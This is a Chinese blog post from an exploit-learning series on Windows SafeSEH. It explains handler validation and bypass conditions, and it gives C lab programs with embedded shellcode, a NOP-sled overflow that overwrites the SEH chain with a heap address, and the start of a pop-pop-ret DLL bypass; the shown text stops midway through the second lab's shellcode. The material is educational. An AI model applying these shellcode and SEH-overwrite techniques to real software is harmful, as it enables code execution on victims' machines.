@@ -1,0 +1,530 @@
+<!doctype html><html lang=en-us dir=ltr><head><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><meta name=description content="SafeSEH简介和简单攻击"><title>漏洞学习笔记-013-SafeSEH简介和简单攻击</title><link rel=canonical href=https://blog.moeomu.com/zh-cn/posts/%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-013-safeseh%E7%AE%80%E4%BB%8B%E5%92%8C%E7%AE%80%E5%8D%95%E6%94%BB%E5%87%BB/><link rel=stylesheet href=/scss/style.min.fe253589db5a54c99fe6b16bfbaf0243d856d34f8c07f3534613b39ed043b738.css><meta property="og:title" content="漏洞学习笔记-013-SafeSEH简介和简单攻击"><meta property="og:description" content="SafeSEH简介和简单攻击"><meta property="og:url" content="https://blog.moeomu.com/zh-cn/posts/%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-013-safeseh%E7%AE%80%E4%BB%8B%E5%92%8C%E7%AE%80%E5%8D%95%E6%94%BB%E5%87%BB/"><meta property="og:site_name" content="Moeomu博客"><meta property="og:type" content="article"><meta property="article:section" content="Post"><meta property="article:tag" content="Windows"><meta property="article:tag" content="Exploit"><meta property="article:published_time" content="2020-11-12T09:40:00+08:00"><meta property="article:modified_time" content="2020-11-12T09:40:00+08:00"><meta name=twitter:title content="漏洞学习笔记-013-SafeSEH简介和简单攻击"><meta name=twitter:description content="SafeSEH简介和简单攻击"></head><body class=article-page><script>(function(){const e="StackColorScheme";localStorage.getItem(e)||localStorage.setItem(e,"auto")})()</script><script>(function(){const t="StackColorScheme",e=localStorage.getItem(t),n=window.matchMedia("(prefers-color-scheme: dark)").matches===!0;e=="dark"||e==="auto"&&n?document.documentElement.dataset.scheme="dark":document.documentElement.dataset.scheme="light"})()</script><div class="container main-container flex on-phone--column extended"><aside class="sidebar left-sidebar sticky"><button class="hamburger hamburger--spin" type=button id=toggle-menu aria-label=切换菜单>
+<span class=hamburger-box><span class=hamburger-inner></span></span></button><header><figure class=site-avatar><a href=/zh-cn><img src=/img/avatar_hu8dfcad5825ff606a9f1f254d5950a70a_24536_300x0_resize_q75_box.jpg width=300 height=300 class=site-logo loading=lazy alt=Avatar></a>
+<span class=emoji>🍥</span></figure><div class=site-meta><h1 class=site-name><a href=/zh-cn>Moeomu博客</a></h1><h2 class=site-description>Misaka Study Notes.</h2></div></header><ol class=social-menu><li><a href=https://github.com/BloveDawn target=_blank title=GitHub><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-brand-github" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M9 19c-4.3 1.4-4.3-2.5-6-3m12 5v-3.5c0-1 .1-1.4-.5-2 2.8-.3 5.5-1.4 5.5-6a4.6 4.6.0 00-1.3-3.2 4.2 4.2.0 00-.1-3.2s-1.1-.3-3.5 1.3a12.3 12.3.0 00-6.2.0C6.5 2.8 5.4 3.1 5.4 3.1a4.2 4.2.0 00-.1 3.2A4.6 4.6.0 004 9.5c0 4.6 2.7 5.7 5.5 6-.6.6-.6 1.2-.5 2V21"/></svg></a></li><li><a href=https://twitter.com target=_blank title=Twitter><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-brand-twitter" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M22 4.01c-1 .49-1.98.689-3 .99-1.121-1.265-2.783-1.335-4.38-.737S11.977 6.323 12 8v1c-3.245.083-6.135-1.395-8-4 0 0-4.182 7.433 4 11-1.872 1.247-3.739 2.088-6 2 3.308 1.803 6.913 2.423 10.034 1.517 3.58-1.04 6.522-3.723 7.651-7.742a13.84 13.84.0 00.497-3.753C20.18 7.773 21.692 5.25 22 4.009z"/></svg></a></li></ol><ol class=menu id=main-menu><li><a href=/zh-cn/><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-home" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><polyline points="5 12 3 12 12 3 21 12 19 12"/><path d="M5 12v7a2 2 0 002 2h10a2 2 0 002-2v-7"/><path d="M9 21v-6a2 2 0 012-2h2a2 2 0 012 2v6"/></svg><span>主页</span></a></li><li><a href=/zh-cn/%E5%BD%92%E6%A1%A3/><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-archive" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><rect x="3" y="4" width="18" height="4" rx="2"/><path d="M5 8v10a2 2 0 002 2h10a2 2 0 002-2V8"/><line x1="10" y1="12" x2="14" y2="12"/></svg><span>归档</span></a></li><li><a href=/zh-cn/%E6%90%9C%E7%B4%A2/><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-search" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="10" cy="10" r="7"/><line x1="21" y1="21" x2="15" y2="15"/></svg><span>搜索</span></a></li><li><a href=/zh-cn/%E9%93%BE%E6%8E%A5/><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-link" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><path d="M10 14a3.5 3.5.0 005 0l4-4a3.5 3.5.0 00-5-5l-.5.5"/><path d="M14 10a3.5 3.5.0 00-5 0l-4 4a3.5 3.5.0 005 5l.5-.5"/></svg><span>链接</span></a></li><li><a href=/zh-cn/%E7%95%99%E8%A8%80%E6%9D%BF/><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-brand-hipchat" width="44" height="44" viewBox="0 0 24 24" stroke-width="1.5" stroke="#2c3e50" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M17.802 17.292s.077-.055.2-.149C19.845 15.718 21 13.653 21 11.354c0-4.286-4.03-7.764-8.998-7.764C7.032 3.59 3 7.068 3 11.354 3 15.642 7.03 19 12 19c.424.0 1.12-.028 2.088-.084 1.262.82 3.104 1.493 4.716 1.493.499.0.734-.41.414-.828-.486-.596-1.156-1.551-1.416-2.29z"/><path d="M7.5 13.5c2.5 2.5 6.5 2.5 9 0"/></svg><span>留言板</span></a></li><li><a href=/zh-cn/%E5%85%B3%E4%BA%8E/><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-user" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="12" cy="7" r="4"/><path d="M6 21v-2a4 4 0 014-4h4a4 4 0 014 4v2"/></svg><span>关于</span></a></li><div class=menu-bottom-section><li id=i18n-switch><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-language" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M4 5h7"/><path d="M9 3v2c0 4.418-2.239 8-5 8"/><path d="M5 9c-.003 2.144 2.952 3.908 6.7 4"/><path d="M12 20l4-9 4 9"/><path d="M19.1 18h-6.2"/></svg><select name=language onchange="window.location.href=this.selectedOptions[0].value"><option value=https://blog.moeomu.com/>English</option><option value=https://blog.moeomu.com/zh-cn/ selected>中文</option></select></li><li id=dark-mode-toggle><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="8" cy="12" r="2"/><rect x="2" y="6" width="20" height="12" rx="6"/></svg><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-right" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="16" cy="12" r="2"/><rect x="2" y="6" width="20" height="12" rx="6"/></svg><span>暗色模式</span></li></div></ol></aside><main class="main full-width"><article class=main-article><header class=article-header><div class=article-details><header class=article-category><a href=/zh-cn/categories/exploit/>Exploit</a></header><div class=article-title-wrapper><h2 class=article-title><a href=/zh-cn/posts/%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-013-safeseh%E7%AE%80%E4%BB%8B%E5%92%8C%E7%AE%80%E5%8D%95%E6%94%BB%E5%87%BB/>漏洞学习笔记-013-SafeSEH简介和简单攻击</a></h2><h3 class=article-subtitle>SafeSEH简介和简单攻击</h3></div><footer class=article-time><div><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-calendar-time" width="56" height="56" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><path d="M11.795 21H5a2 2 0 01-2-2V7a2 2 0 012-2h12a2 2 0 012 2v4"/><circle cx="18" cy="18" r="4"/><path d="M15 3v4"/><path d="M7 3v4"/><path d="M3 11h16"/><path d="M18 16.496V18l1 1"/></svg><time class=article-time--published>Nov 12, 2020</time></div><div><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="12" cy="12" r="9"/><polyline points="12 7 12 12 15 15"/></svg><time class=article-time--reading>阅读时长: 5 分钟</time></div></footer><footer class=article-translations><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-language" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M4 5h7"/><path d="M9 3v2c0 4.418-2.239 8-5 8"/><path d="M5 9c-.003 2.144 2.952 3.908 6.7 4"/><path d="M12 20l4-9 4 9"/><path d="M19.1 18h-6.2"/></svg><div><a href=https://blog.moeomu.com/posts/exploit-learning-notes-013-safeseh-introduction-and-simple-attacks/ class=link>English</a></div></footer></div></header><section class=article-content><p>本文来源：<a class=link href=/zh-cn/posts/%e6%bc%8f%e6%b4%9e%e5%ad%a6%e4%b9%a0%e7%ac%94%e8%ae%b0-013-safeseh%e7%ae%80%e4%bb%8b%e5%92%8c%e7%ae%80%e5%8d%95%e6%94%bb%e5%87%bb/>Moeomu的博客</a></p><h2 id=safeseh简介>SafeSEH简介</h2><h3 id=工作>工作</h3><ul><li>检查异常处理链是否位于当前程序的栈中。如果不在当前栈中，程序将终止异常处理函数的调用。</li><li>检查异常处理函数指针是否指向当前程序的栈中。如果指向当前栈中，程序将终止异常处理函数的调用。</li><li>在前面两项检查都通过后，程序调用一个全新的函数<code>RtlIsValidHandler()</code>，来对异常处理函数的有效性进行验证，此函数的工作如下<ul><li>判断异常处理函数地址是不是在加载模块的内存空间，如果属于加载模块的内存空间，校验函数将依次进行如下校验。<ul><li>判断程序是否设置了<code>IMAGE_DLLCHARACTERISTICS_NO_SEH</code>标识。如果设置了这个标识，这个程序内的异常会被忽略。所以当这个标志被设置时，函数直接返回校验失败。</li><li>检测程序是否包含安全<code>S.E.H</code>表。如果程序包含安全<code>S.E.H</code>表，则将当前的异常处理函数地址与该表进行匹配，匹配成功则返回校验成功，匹配失败则返回校验失败。</li><li>判断程序是否设置<code>ILonly</code>标识。如果设置了这个标识，说明该程序只包含.NET编译中间语言，函数直接返回校验失败。</li><li>判断异常处理函数地址是否位于不可执行页(non-executable page)上。当异常处理函数地址位于不可执行页上时，校验函数将检测<code>DEP</code>是否开启，如果系统未开启<code>DEP</code>则返回校验成功，否则程序抛出访问违例的异常。</li></ul></li><li>如果异常处理函数的地址没有包含在加载模块的内存空间，校验函数将直接进行<code>DEP</code>相关检测，函数依次进行如下校验。<ul><li>判断异常处理函数地址是否位于不可执行页(non-executable page)上。当异常处理函数地址位于不可执行页上时，校验函数将检测<code>DEP</code>是否开启，如果系统未开启<code>DEP</code>则返回校验成功，否则程序抛出访问违例的异常。</li><li>判断系统是否允许跳转到加载模块的内存空间外执行，如果允许则返回校验成功，否则返回校验失败。</li></ul></li></ul></li></ul><blockquote><p><code>RtlIsValidHandler()</code>函数检测流程图</p></blockquote><p><img src=https://s1.ax1x.com/2020/11/11/BvASMR.png loading=lazy alt=BvASMR.png></p><h3 id=可行性分析>可行性分析</h3><ul><li>异常处理函数位于加载模块内存范围之外，DEP关闭</li><li>异常处理函数位于加载模块内存范围之内，相应模块未启用SafeSEH(安全S.E.H表为空)，同时相应模块不是纯IL</li><li>异常处理函数位于加载模块内存范围之内，相应模块启用SafeSEH(安全S.E.H表不为空)，异常处理函数地址包含在安全S.E.H表中</li></ul><blockquote><p>终极方案：将shellcode布置在堆区，即使SEH验证不可行仍旧会调用</p></blockquote><hr><h2 id=堆中绕过seh>堆中绕过SEH</h2><h3 id=代码>代码</h3><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span><span class=lnt>20
+</span><span class=lnt>21
+</span><span class=lnt>22
+</span><span class=lnt>23
+</span><span class=lnt>24
+</span><span class=lnt>25
+</span><span class=lnt>26
+</span><span class=lnt>27
+</span><span class=lnt>28
+</span><span class=lnt>29
+</span><span class=lnt>30
+</span><span class=lnt>31
+</span><span class=lnt>32
+</span><span class=lnt>33
+</span><span class=lnt>34
+</span><span class=lnt>35
+</span><span class=lnt>36
+</span><span class=lnt>37
+</span><span class=lnt>38
+</span><span class=lnt>39
+</span><span class=lnt>40
+</span><span class=lnt>41
+</span><span class=lnt>42
+</span><span class=lnt>43
+</span><span class=lnt>44
+</span><span class=lnt>45
+</span><span class=lnt>46
+</span><span class=lnt>47
+</span><span class=lnt>48
+</span><span class=lnt>49
+</span><span class=lnt>50
+</span><span class=lnt>51
+</span><span class=lnt>52
+</span><span class=lnt>53
+</span><span class=lnt>54
+</span><span class=lnt>55
+</span><span class=lnt>56
+</span><span class=lnt>57
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-cpp data-lang=cpp><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;stdio.h&gt;</span><span class=cp>
+</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;stdlib.h&gt;</span><span class=cp>
+</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;string.h&gt;</span><span class=cp>
+</span></span></span><span class=line><span class=cl><span class=cp></span>
+</span></span><span class=line><span class=cl><span class=kt>char</span> <span class=n>shellcode</span><span class=p>[]</span> <span class=o>=</span>
+</span></span><span class=line><span class=cl><span class=s>&#34;</span><span class=se>\xFC\x68\x6A\x0A\x38\x1E\x68\x63\x89\xD1\x4F\x68\x32\x74\x91\x0C</span><span class=s>&#34;</span>
+</span></span><span class=line><span class=cl><span class=s>&#34;</span><span class=se>\x8B\xF4\x8D\x7E\xF4\x33\xDB\xB7\x04\x2B\xE3\x66\xBB\x33\x32\x53</span><span class=s>&#34;</span>
+</span></span><span class=line><span class=cl><span class=s>&#34;</span><span class=se>\x68\x75\x73\x65\x72\x54\x33\xD2\x64\x8B\x5A\x30\x8B\x4B\x0C\x8B</span><span class=s>&#34;</span>
+</span></span><span class=line><span class=cl><span class=s>&#34;</span><span class=se>\x49\x1C\x8B\x09\x8B\x69\x08\xAD\x3D\x6A\x0A\x38\x1E\x75\x05\x95</span><span class=s>&#34;</span>
+</span></span><span class=line><span class=cl><span class=s>&#34;</span><span class=se>\xFF\x57\xF8\x95\x60\x8B\x45\x3C\x8B\x4C\x05\x78\x03\xCD\x8B\x59</span><span class=s>&#34;</span>
+</span></span><span class=line><span class=cl><span class=s>&#34;</span><span class=se>\x20\x03\xDD\x33\xFF\x47\x8B\x34\xBB\x03\xF5\x99\x0F\xBE\x06\x3A</span><span class=s>&#34;</span>
+</span></span><span class=line><span class=cl><span class=s>&#34;</span><span class=se>\xC4\x74\x08\xC1\xCA\x07\x03\xD0\x46\xEB\xF1\x3B\x54\x24\x1C\x75</span><span class=s>&#34;</span>
+</span></span><span class=line><span class=cl><span class=s>&#34;</span><span class=se>\xE4\x8B\x59\x24\x03\xDD\x66\x8B\x3C\x7B\x8B\x59\x1C\x03\xDD\x03</span><span class=s>&#34;</span>
+</span></span><span class=line><span class=cl><span class=s>&#34;</span><span class=se>\x2C\xBB\x95\x5F\xAB\x57\x61\x3D\x6A\x0A\x38\x1E\x75\xA9\x33\xDB</span><span class=s>&#34;</span>
+</span></span><span class=line><span class=cl><span class=s>&#34;</span><span class=se>\x53\x68\x6B\x61\x6F\x6F\x68\x4D\x69\x73\x61\x8B\xC4\x53\x50\x50</span><span class=s>&#34;</span>
+</span></span><span class=line><span class=cl><span class=s>&#34;</span><span class=se>\x53\xFF\x57\xFC\x53\xFF\x57\xF8\x90\x90\x90\x90\x90\x90\x90\x90</span><span class=s>&#34;</span>
+</span></span><span class=line><span class=cl><span class=s>&#34;</span><span class=se>\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90</span><span class=s>&#34;</span>
+</span></span><span class=line><span class=cl><span class=p>;</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=kt>char</span> <span class=n>overflowcode</span><span class=p>[]</span> <span class=o>=</span> 
+</span></span><span class=line><span class=cl><span class=s>&#34;</span><span class=se>\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90</span><span class=s>&#34;</span>
+</span></span><span class=line><span class=cl><span class=s>&#34;</span><span class=se>\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90</span><span class=s>&#34;</span>
+</span></span><span class=line><span class=cl><span class=s>&#34;</span><span class=se>\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90</span><span class=s>&#34;</span>
+</span></span><span class=line><span class=cl><span class=s>&#34;</span><span class=se>\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90</span><span class=s>&#34;</span>
+</span></span><span class=line><span class=cl><span class=s>&#34;</span><span class=se>\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90</span><span class=s>&#34;</span>
+</span></span><span class=line><span class=cl><span class=s>&#34;</span><span class=se>\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90</span><span class=s>&#34;</span>
+</span></span><span class=line><span class=cl><span class=s>&#34;</span><span class=se>\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90</span><span class=s>&#34;</span>
+</span></span><span class=line><span class=cl><span class=s>&#34;</span><span class=se>\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90</span><span class=s>&#34;</span>
+</span></span><span class=line><span class=cl><span class=s>&#34;</span><span class=se>\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90</span><span class=s>&#34;</span>
+</span></span><span class=line><span class=cl><span class=s>&#34;</span><span class=se>\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90</span><span class=s>&#34;</span>
+</span></span><span class=line><span class=cl><span class=s>&#34;</span><span class=se>\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90</span><span class=s>&#34;</span>
+</span></span><span class=line><span class=cl><span class=s>&#34;</span><span class=se>\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90</span><span class=s>&#34;</span>
+</span></span><span class=line><span class=cl><span class=s>&#34;</span><span class=se>\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90</span><span class=s>&#34;</span>
+</span></span><span class=line><span class=cl><span class=s>&#34;</span><span class=se>\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90</span><span class=s>&#34;</span>
+</span></span><span class=line><span class=cl><span class=s>&#34;</span><span class=se>\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90</span><span class=s>&#34;</span>
+</span></span><span class=line><span class=cl><span class=s>&#34;</span><span class=se>\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90</span><span class=s>&#34;</span>
+</span></span><span class=line><span class=cl><span class=s>&#34;</span><span class=se>\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90</span><span class=s>&#34;</span>
+</span></span><span class=line><span class=cl><span class=s>&#34;</span><span class=se>\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90</span><span class=s>&#34;</span>
+</span></span><span class=line><span class=cl><span class=s>&#34;</span><span class=se>\x90\x90\x90\x90</span><span class=s>&#34;</span>
+</span></span><span class=line><span class=cl><span class=s>&#34;</span><span class=se>\xE0\xFF\x12\x90</span><span class=s>&#34;</span>
+</span></span><span class=line><span class=cl><span class=s>&#34;</span><span class=se>\x08\x3E\x39\x00</span><span class=s>&#34;</span> <span class=c1>// address of shellcode in heap ;
+</span></span></span><span class=line><span class=cl><span class=c1></span><span class=p>;</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=kt>void</span> <span class=nf>test</span><span class=p>(</span><span class=kt>char</span> <span class=o>*</span> <span class=n>input</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=p>{</span>
+</span></span><span class=line><span class=cl>	<span class=kt>char</span> <span class=n>str</span><span class=p>[</span><span class=mi>200</span><span class=p>];</span>
+</span></span><span class=line><span class=cl>	<span class=n>strcpy</span><span class=p>(</span><span class=n>str</span><span class=p>,</span> <span class=n>input</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>	<span class=kt>int</span> <span class=n>zero</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>	<span class=n>zero</span> <span class=o>=</span> <span class=mi>1</span> <span class=o>/</span> <span class=n>zero</span><span class=p>;</span>
+</span></span><span class=line><span class=cl><span class=p>}</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=kt>void</span> <span class=nf>main</span><span class=p>()</span>
+</span></span><span class=line><span class=cl><span class=p>{</span>
+</span></span><span class=line><span class=cl>	<span class=kt>char</span><span class=o>*</span> <span class=n>buf</span> <span class=o>=</span> <span class=p>(</span><span class=kt>char</span> <span class=o>*</span><span class=p>)</span><span class=n>malloc</span><span class=p>(</span><span class=mi>500</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>	<span class=n>strcpy</span><span class=p>(</span><span class=n>buf</span><span class=p>,</span> <span class=n>shellcode</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>	<span class=n>test</span><span class=p>(</span><span class=n>overflowcode</span><span class=p>);</span>
+</span></span><span class=line><span class=cl><span class=p>}</span>
+</span></span></code></pre></td></tr></table></div></div><h3 id=说明>说明</h3><ul><li>将shellcode放入堆区</li><li>栈溢出，将SEH链地址覆写为堆区shellcode的地址</li><li>调用SEH，随后自动触发shellcode</li></ul><blockquote><p>注意：注意0的情况，字符串复制是遇到0截止的</p></blockquote><h2 id=利用未启用safeseh的模块来绕过safeseh>利用未启用SafeSEH的模块来绕过SafeSEH</h2><h3 id=代码-1>代码</h3><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span><span class=lnt>20
+</span><span class=lnt>21
+</span><span class=lnt>22
+</span><span class=lnt>23
+</span><span class=lnt>24
+</span><span class=lnt>25
+</span><span class=lnt>26
+</span><span class=lnt>27
+</span><span class=lnt>28
+</span><span class=lnt>29
+</span><span class=lnt>30
+</span><span class=lnt>31
+</span><span class=lnt>32
+</span><span class=lnt>33
+</span><span class=lnt>34
+</span><span class=lnt>35
+</span><span class=lnt>36
+</span><span class=lnt>37
+</span><span class=lnt>38
+</span><span class=lnt>39
+</span><span class=lnt>40
+</span><span class=lnt>41
+</span><span class=lnt>42
+</span><span class=lnt>43
+</span><span class=lnt>44
+</span><span class=lnt>45
+</span><span class=lnt>46
+</span><span class=lnt>47
+</span><span class=lnt>48
+</span><span class=lnt>49
+</span><span class=lnt>50
+</span><span class=lnt>51
+</span><span class=lnt>52
+</span><span class=lnt>53
+</span><span class=lnt>54
+</span><span class=lnt>55
+</span><span class=lnt>56
+</span><span class=lnt>57
+</span><span class=lnt>58
+</span><span class=lnt>59
+</span><span class=lnt>60
+</span><span class=lnt>61
+</span><span class=lnt>62
+</span><span class=lnt>63
+</span><span class=lnt>64
+</span><span class=lnt>65
+</span><span class=lnt>66
+</span><span class=lnt>67
+</span><span class=lnt>68
+</span><span class=lnt>69
+</span><span class=lnt>70
+</span><span class=lnt>71
+</span><span class=lnt>72
+</span><span class=lnt>73
+</span><span class=lnt>74
+</span><span class=lnt>75
+</span><span class=lnt>76
+</span><span class=lnt>77
+</span><span class=lnt>78
+</span><span class=lnt>79
+</span><span class=lnt>80
+</span><span class=lnt>81
+</span><span class=lnt>82
+</span><span class=lnt>83
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-cpp data-lang=cpp><span class=line><span class=cl><span class=c1>// SEH_NOSafeSEH_JUMP.DLL
+</span></span></span><span class=line><span class=cl><span class=c1></span><span class=cp># include &lt;windows.h&gt;
+</span></span></span><span class=line><span class=cl><span class=cp></span>
+</span></span><span class=line><span class=cl><span class=n>BOOL</span> <span class=n>APIENTRY</span> <span class=nf>DllMain</span><span class=p>(</span><span class=n>HANDLE</span> <span class=n>hModule</span><span class=p>,</span> <span class=n>DWORD</span> <span class=n>ul_reason_for_call</span><span class=p>,</span> <span class=n>LPVOID</span> <span class=n>lpReserved</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=p>{</span>
+</span></span><span class=line><span class=cl>  <span class=k>return</span> <span class=n>TRUE</span><span class=p>;</span>
+</span></span><span class=line><span class=cl><span class=p>}</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=kt>void</span> <span class=nf>jump</span><span class=p>()</span>
+</span></span><span class=line><span class=cl><span class=p>{</span>
+</span></span><span class=line><span class=cl>  <span class=kr>__asm</span>
+</span></span><span class=line><span class=cl>  <span class=p>{</span>
+</span></span><span class=line><span class=cl>    <span class=n>pop</span> <span class=n>eax</span>
+</span></span><span class=line><span class=cl>    <span class=n>pop</span> <span class=n>eax</span>
+</span></span><span class=line><span class=cl>	  <span class=n>retn</span>
+</span></span><span class=line><span class=cl>  <span class=p>}</span>
+</span></span><span class=line><span class=cl><span class=p>}</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=c1>// SEH_NOSafeSEH.EXE
+</span></span></span><span class=line><span class=cl><span class=c1></span><span class=cp>#include</span> <span class=cpf>&lt;stdio.h&gt;</span><span class=cp>
+</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;string.h&gt;</span><span class=cp>
+</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;windows.h&gt;</span><span class=cp>
+</span></span></span><span class=line><span class=cl><span class=cp></span>
+</span></span><span class=line><span class=cl><span class=kt>char</span> <span class=n>shellcode</span><span class=p>[]</span> <span class=o>=</span> 
+</span></span><span class=line><span class=cl><span class=s>&#34;</span><span class=se>\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90</span><span class=s>&#34;</span>
+</span></span><span class=line><span class=cl><span class=s>&#34;</span><span class=se>\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90</span><span class=s>&#34;</span>
